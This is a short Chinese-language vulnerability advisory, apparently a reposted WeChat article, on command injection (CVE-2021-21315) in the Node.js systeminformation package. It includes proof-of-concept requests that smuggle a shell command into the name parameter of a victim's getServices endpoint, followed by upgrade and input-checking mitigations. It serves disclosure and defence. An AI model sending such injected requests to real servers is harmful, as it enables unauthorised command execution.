> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/trm1F9oZlj4ceMsbsoboKw)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3ibbpIgdsiccJb6iaTI8IQvBA2q420nfWKulpvKmUBYexLpk5ich9zlQQH9h2dxY2KPONysLDicJB9YSg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

Node.js库中的systeminformation软件包中存在一个命令注入漏洞（CVE-2021-21315）攻击者可以通过「systeminformation」中代码注入漏洞的存在意味着攻击者可以通过在组件使用的未初始化参数内小心翼翼地注入有效载荷来执行系统命令。

  

POC:

  

```
`[PoC]``[Victim Site]/api/getServices?name=$(echo -e 'Sekurak' > pwn.txt)``[Victim Site]/api/getServices?name[]=$(echo -e 'Sekurak' > pwn.txt)`
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3ibbpIgdsiccJb6iaTI8IQvBACYo0Eu0AbI3UbcRUFNvPPvtm4XhCkxqOZq8LmZtoOrEIQiaaaxrfMQQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/aPmkR80bcV3ibbpIgdsiccJb6iaTI8IQvBAxQ9rFMSzj27lkDribervQPsP1UFtNYI56zsk5Qvzn3ASLibicExnwqp9Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

目前该漏洞已经修复，将systeminformation及时升级到5.3.1或更高版本。

  

https://www.npmjs.com/package/systeminformation

**缓解措施**

如果无法升级，可以检查或清理传递给si.inetLatency()、si.inetChecksite()、si.services()、si.processLoad()的参数，只允许使用string，拒绝任何数组。